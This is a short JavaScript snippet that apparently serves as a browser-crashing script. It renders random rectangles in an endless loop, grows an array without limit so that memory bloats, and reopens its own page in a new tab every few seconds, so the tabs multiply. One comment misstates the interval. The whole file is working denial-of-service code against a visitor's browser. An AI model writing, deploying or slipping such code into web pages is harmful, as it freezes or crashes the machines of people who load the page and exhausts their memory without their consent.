// Canvas rendering in an infinite loop
const canvas = document.getElementById('lagCanvas');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;
const ctx = canvas.getContext('2d');

// Infinite rendering loop with a slower frame rate
function renderRandomRects() {
    ctx.fillStyle = `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
    ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 50, 50);
    setTimeout(renderRandomRects, 100); // Delay the next frame by 100ms
}

renderRandomRects();

// Gradually bloat memory over time
const bigArray = [];
function slowMemoryBloat() {
    bigArray.push(new Array(1000).fill(Math.random()));
    console.log(`Array size: ${bigArray.length * 1000} elements`);
    setTimeout(slowMemoryBloat, 500); // Slower memory growth every 500ms
}

slowMemoryBloat();

// Recursively open new pages at a controlled interval
(function openContinuously() {
    setInterval(() => {
        window.open(window.location.href, '_blank');
    }, 3000); // Opens a new page every 5 seconds
})();
